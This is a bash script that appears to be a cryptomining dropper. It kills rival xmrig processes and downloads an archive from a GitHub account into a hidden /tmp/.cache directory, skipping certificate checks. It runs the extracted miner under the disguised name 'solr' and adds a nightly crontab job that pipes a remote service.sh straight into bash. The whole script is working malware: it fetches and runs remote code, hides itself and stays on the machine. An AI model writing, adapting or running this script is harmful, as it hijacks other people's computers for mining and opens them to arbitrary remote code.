#!/bin/bash
config_file="config.json"

killall xmrig

if ps aux | grep xmrig | grep -v grep > /dev/null; then
    ps aux | grep xmrig | awk '{print $1}' | xargs kill -9
    echo "[+] Kill all xmrig process"
else
    echo "[-] Not found xmrig process"
fi

# p=$(pwd)
p="/tmp"
random_number=$(shuf -i 10000000-99999999 -n 1)
ho=$(hostname)
if [ ${#ho} -lt 1 ]; then
    ho=$random_number
fi

ROOT_path="$p/.cache"
apachee_url="https://github.com/lazy12121212/server/raw/main/apache.tar.gz"
command=""
existing_crontab=$(crontab -l 2>/dev/null)

if [ ! -d "$ROOT_path" ]; then
    echo "The folder does not exist, creating"
    mkdir -p "$ROOT_path"
    if [ $? -ne 0 ]; then
        echo "$ROOT_path Unable to create folder !!!"
        ROOT_path="/tmp/.cache"
        mkdir -p "$ROOT_path"
        if [ $? -ne 0 ]; then
            echo "$ROOT_path Unable to create folder !!!"
            exit 1
        else
            p="/tmp"
        fi
    fi
fi

cd "$ROOT_path" || handle_error "Unable to switch to directory: $ROOT_path !!!"

wget --no-check-certificate -O "apachee.tar.gz" "$apachee_url"
if [ -f "apachee.tar.gz" ];then
    echo "Wget apachee downloaded successfully"
else
    echo "Wget apachee download failed, try curl apachee"
    curl -Lk "$apachee_url" -o "apachee.tar.gz"
    if [ -f "apachee.tar.gz" ];then
        echo "curl apachee downloaded successfully"
    else
        echo "curl download failed"
   fi
fi

tar -xzf "apachee.tar.gz" -C "$ROOT_path"

chmod 777 "$ROOT_path/solr"

if [ -f "$config_file" ]; then
    sed -i "s/\"pass\": \"random\"/\"pass\": \"$ho\"/g" "$config_file"
    echo "Updated pass field in $config_file with hostname: $ho"
else
    echo "Config file $config_file not found"
fi

rm -rf apachee.tar.gz

com="./solr"
start_sh="$ROOT_path/start.sh"
if [ -f "$start_sh" ]; then
    echo "Startup file exists: $start_sh"
    echo "change startup file"
    echo $com > start.sh
    chmod +x start.sh
    ./start.sh
else
    echo "The startup file does not exist: $start_sh"
    echo "Generate startup file"
    echo $com > start.sh
    chmod +x start.sh
    ./start.sh
fi

sleep 5

if pgrep solr > /dev/null; then
    echo "solr Process exists, exit Shell code execution"
else
    echo "solr Process does not exist"
    exit 0
fi

if crontab -l | grep "curl -sSfk https://raw.githubusercontent.com/lazy12121212/server/main/service.sh"; then
    echo "The specified scheduled task has been added !!!"
else
    (crontab -l 2>/dev/null; printf "0 1 * * *  mkdir -p $p;cd $p;curl -sSfk https://raw.githubusercontent.com/lazy12121212/server/main/service.sh | bash\n") | crontab -
    echo "The specified scheduled task has been added"
fi
